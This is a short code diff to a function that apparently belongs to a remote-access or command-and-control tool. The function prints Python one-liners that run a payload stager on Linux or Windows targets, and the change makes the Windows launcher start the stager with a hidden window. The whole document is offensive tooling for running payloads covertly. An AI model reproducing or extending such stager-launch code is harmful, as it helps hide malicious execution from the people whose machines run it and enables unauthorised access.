@@ -573,7 +573,7 @@ def parse_command(command, server, queue, database):
                 if command[2] == 'lin':  # Linux one-liner (uses \" to escape inline double-quotes)
                     util.print('python3 -c "{}"'.format("exec(\\\"\\\"\\\"{}\\\"\\\"\\\") &".format(python_stager)), database)
                 elif command[2] == 'win':  # Windows one-liner (uses `" to escape inline double-quotes)
-                    util.print('python3 -c "{}"'.format("exec(`\"`\"`\"{}`\"`\"`\")".format(python_stager)), database)
+                    util.print('START -WindowStyle hidden -FilePath "python3" -ArgumentList "-c","{}"'.format("exec(`\"`\"`\"{}`\"`\"`\")".format(python_stager)), database)
                 else:
                     util.print('** Incorrect input, expected target operating system ("win" or "lin"), received: {}'.format(command[2:]), database)
             else:
